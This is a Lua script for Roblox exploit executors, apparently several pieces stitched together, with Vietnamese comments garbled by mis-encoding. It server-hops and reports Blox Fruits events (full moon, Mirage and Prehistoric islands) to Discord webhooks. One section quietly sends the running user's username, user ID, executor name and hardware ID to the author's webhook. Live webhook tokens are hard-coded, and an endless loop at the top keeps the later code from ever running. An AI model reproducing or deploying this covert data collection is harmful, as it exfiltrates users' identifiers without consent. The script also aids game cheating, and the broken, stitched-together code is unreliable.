local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")

local player = Players.LocalPlayer
local PlaceID = game.PlaceId
local HopDelay = 1-- th·ªùi gian delay m·ªói l·∫ßn hop, t√≠nh b·∫±ng gi√¢y

-- H√†m l·∫•y danh s√°ch server
function GetServers()
    local Servers = {}
    local Cursor = ""
    local Success, Response

    repeat
        local URL = "https://games.roblox.com/v1/games/"..PlaceID.."/servers/Public?limit=100&sortOrder=Asc&cursor="..Cursor
        Success, Response = pcall(function()
            return HttpService:JSONDecode(game:HttpGet(URL))
        end)
        if Success and Response and Response.data then
            for _, Server in ipairs(Response.data) do
                if Server.playing < Server.maxPlayers and Server.id ~= game.JobId then
                    table.insert(Servers, Server.id)
                end
            end
            Cursor = Response.nextPageCursor or ""
        else
            break
        end
        wait(0.2)
    until Cursor == "" or not Success

    return Servers
end

-- H√†m hop server li√™n t·ª•c
function AutoHop()
    while true do
        local servers = GetServers()
        if #servers > 0 then
            local randomServer = servers[math.random(1, #servers)]
            TeleportService:TeleportToPlaceInstance(PlaceID, randomServer, player)
        else
            warn("Kh√¥ng t√¨m ƒë∆∞·ª£c server ph√π h·ª£p, th·ª≠ l·∫°i sau...")
        end
        wait(HopDelay)
    end
end

AutoHop()

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

repeat wait() until game:IsLoaded()

local player = Players.LocalPlayer


local displayName = player.DisplayName
local username = player.Name
local userId = tostring(player.UserId)
local placeId = tostring(game.PlaceId)
local jobId = tostring(game.JobId)
local executor = identifyexecutor and identifyexecutor() or "Kh√¥ng x√°c ƒë·ªãnh"
local hwid = gethwid and gethwid() or "Kh√¥ng l·∫•y ƒë∆∞·ª£c"


local joinScript = string.format(
    'game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s", game.Players.LocalPlayer)',
    placeId,
    jobId
)


local webhookUrl = "https://discord.com/api/webhooks/1380938876096610394/lWZBTIKe8xZOVJ71WZp9ngjHhcNbwE0Avprv6BZgREUpiP9rdzbW-aEaAhMZCMEWnh2a" 


local embed = {
    title = "Th√¥ng Tin T√†i Kho·∫£n Roblox",
    color = 0x00FFFF, 
    fields = {
        { name = "T√™n hi·ªÉn th·ªã", value = "`" .. displayName .. "`", inline = false },
        { name = " T√™n ng∆∞·ªùi d√πng", value = "`" .. username .. "`", inline = false },
        { name = " User ID", value = "`" .. userId .. "`", inline = false },
        { name = "Executor", value = "`" .. executor .. "`", inline = false },
        { name = " HWID", value = "`" .. hwid .. "`", inline = false },
        { name = " Place ID", value = "`" .. placeId .. "`", inline = false },
        { name = " Job ID", value = "`" .. jobId .. "`", inline = false },
        { name = " Script Hop", value = "```lua\n" .. joinScript .. "\n```", inline = false },
        { name = "‚úÖ Tr·∫°ng th√°i", value = "**+1 b√© d√πng script **\nüî• *C·∫£m ∆†n Ch√∫ng M√†y*", inline = false }
    }
}


local payload = {
    embeds = {embed}
}

local requestFunc =
    (syn and syn.request) or
    (http and http.request) or
    (fluxus and fluxus.request) or
    (krnl and krnl.request)

if requestFunc then
    local success, err = pcall(function()
        requestFunc({
            Url = webhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(payload)
        })
    end)

    if success then
        print("‚úÖ ƒê√£ g·ª≠i webhook th√†nh c√¥ng!")
    else
        warn("‚ùå L·ªói g·ª≠i webhook:", err)
    end
else
    warn("‚ùå Executor kh√¥ng h·ªó tr·ª£ HTTP Request!")
end


local webhookUrl = "https://discord.com/api/webhooks/1380937704925167666/m6Y9QI4NZ9qbRwukMTyxPEmIa-W10rb9hf7D8MdMl-8vTguL0xbdPf-vGDAmO868GfYd"


local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")


if game.PlaceId ~= 7449423635 then return end


local alreadySent = false


local function getMoonTimer(phase)
    if phase == 5 then
        return "‚úÖ **FULL MOON!**"
    elseif phase == 4 then
        return "üåë **S·∫Øp TrƒÉng Tr√≤n (~1 ph√∫t)**"
    elseif phase == 3 then
        return "üïí **C√≤n ~2 ph√∫t n·ªØa**"
    else
        return "‚åõ **C√≤n l√¢u m·ªõi t·ªõi trƒÉng tr√≤n**"
    end
end


local function sendWebhook()
    local moonPhase = Lighting:GetAttribute("MoonPhase") or 0
    local jobId = game.JobId
    local serverPlayerCount = #Players:GetPlayers()

    local message = {
        ["username"] = "PHUCMAX",
        ["embeds"] = {{
            ["title"] = "üåë Full Moon Server Found [THIRD SEA]",
            ["color"] = 16776960,
            ["fields"] = {
                {
                    ["name"] = "‚è≥ Full Moon Status:",
                    ["value"] = getMoonTimer(moonPhase),
                    ["inline"] = true
                },
                {
                    ["name"] = "üë• Players:",
                    ["value"] = serverPlayerCount .. "/12",
                    ["inline"] = true
                },
                {
                    ["name"] = "üåë Moon Phase:",
                    ["value"] = tostring(moonPhase) .. "/5",
                    ["inline"] = true
                },
                {
                    ["name"] = "üÜî JobId:",
                    ["value"] = "```" .. jobId .. "```",
                    ["inline"] = false
                }
            },
            ["footer"] = {
                ["text"] = "PHUCMAX | " .. os.date("%d/%m/%Y %H:%M:%S")
            }
        }}
    }

    local request = syn and syn.request or http_request or request or (http and http.request)
    if request then
        request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(message)
        })
    end
end


task.spawn(function()
    while true do
        local moonPhase = Lighting:GetAttribute("MoonPhase") or 0
        if moonPhase == 5 and not alreadySent then
            sendWebhook()
            alreadySent = true
        elseif moonPhase ~= 5 then
            alreadySent = false
        end
        task.wait(10)
    end
end)

local objectName = "Mirage" 
local webhookUrl = "https://discord.com/api/webhooks/1380938550962556938/NY9VImFOcUSe8zwMdY68k0YHuwSHGzCrPFpeXlJVUIU_PQw6m4PkyO6VusHjHOoi3JEL" 


local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local player = Players.LocalPlayer
local jobId = game.JobId
local placeId = game.PlaceId


local function getTimeOfDay()
    local time = tonumber(Lighting.ClockTime)
    if time >= 5 and time < 12 then
        return "‚òÄÔ∏è Bu·ªïi s√°ng"
    elseif time >= 12 and time < 18 then
        return "üå§ Bu·ªïi chi·ªÅu"
    else
        return "üåô Bu·ªïi t·ªëi"
    end
end


local function sendWebhook()
    local message = {
        ["username"] = " phucmax Mirage Notify",
        ["embeds"] = {{
            ["title"] = "**phucmax Mirage Notify**",
            ["color"] = 16753920,
            ["fields"] = {
                {["name"] = " üèùÔ∏èSpawn:", ["value"] = "Mirage Island", ["inline"] = true},
                {["name"] = " üïõTime Of Day:", ["value"] = getTimeOfDay(), ["inline"] = true},
                {["name"] = "üë• Players:", ["value"] = tostring(#Players:GetPlayers()) .. " players", ["inline"] = true},
                {["name"] = "üÜîJob-Id:", ["value"] = "```" .. jobId .. "```", ["inline"] = false},
            },
            ["footer"] = {
                ["text"] = "phucmax | " .. os.date("H√¥m nay l√∫c %H:%M")
            }
        }}
    }

    local request = syn and syn.request or http_request or request or (http and http.request)
    if request then
        request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(message)
        })
    end
end


task.wait(10) 
for _, v in pairs(workspace:GetDescendants()) do
    if v:IsA("BasePart") or v:IsA("Model") then
        if v.Name:lower():find(objectName:lower()) then
            print("‚úÖ Mirage Island ƒë∆∞·ª£c t√¨m th·∫•y:", v:GetFullName())
            sendWebhook()
            break
        end
    end
end

local objectName = "Prehistoric" 
local webhookUrl = "https://discord.com/api/webhooks/1380938259282133074/4vz23EwIJzX36MS_I_JyVxaQLhJtgEBJITd83xt2pq41QHrLwFNnhcBLd66lfkmEWsEQ" 


local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local player = Players.LocalPlayer
local jobId = game.JobId
local placeId = game.PlaceId


local function getTimeOfDay()
    local time = tonumber(Lighting.ClockTime)
    if time >= 5 and time < 12 then
        return "‚òÄÔ∏è Bu·ªïi s√°ng"
    elseif time >= 12 and time < 18 then
        return "üå§ Bu·ªïi chi·ªÅu"
    else
        return "üåô Bu·ªïi t·ªëi"
    end
end


local function sendWebhook()
    local message = {
        ["username"] = " phucmax Prehistoric Notify",
        ["embeds"] = {{
            ["title"] = "**phucmax Prehistoric Notify**",
            ["color"] = 16753920,
            ["fields"] = {
                {["name"] = " üåãSpawn:", ["value"] = "Prehistoric Island", ["inline"] = true},
                {["name"] = " üïõTime Of Day:", ["value"] = getTimeOfDay(), ["inline"] = true},
                {["name"] = "üë• Players:", ["value"] = tostring(#Players:GetPlayers()) .. " players", ["inline"] = true},
                {["name"] = "üÜîJob-Id:", ["value"] = "```" .. jobId .. "```", ["inline"] = false},
            },
            ["footer"] = {
                ["text"] = "phucmax| " .. os.date("H√¥m nay l√∫c %H:%M")
            }
        }}
    }

    local request = syn and syn.request or http_request or request or (http and http.request)
    if request then
        request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(message)
        })
    end
end


task.wait(10) 
for _, v in pairs(workspace:GetDescendants()) do
    if v:IsA("BasePart") or v:IsA("Model") then
        if v.Name:lower():find(objectName:lower()) then
            print("‚úÖ Prehistoric Island ƒë∆∞·ª£c t√¨m th·∫•y:", v:GetFullName())
            sendWebhook()
            break
        end
    end
end